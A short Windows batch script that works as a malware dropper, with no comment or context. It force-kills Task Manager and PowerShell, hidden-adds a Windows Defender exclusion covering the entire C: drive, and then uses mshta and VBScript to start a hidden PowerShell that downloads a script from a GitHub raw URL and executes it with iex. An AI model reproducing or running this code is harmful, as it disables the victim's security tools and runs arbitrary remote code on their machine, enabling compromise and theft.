@echo off
taskkill /f /im taskmgr.exe
taskkill /f /im powershell.exe
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:'"

mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t",0))
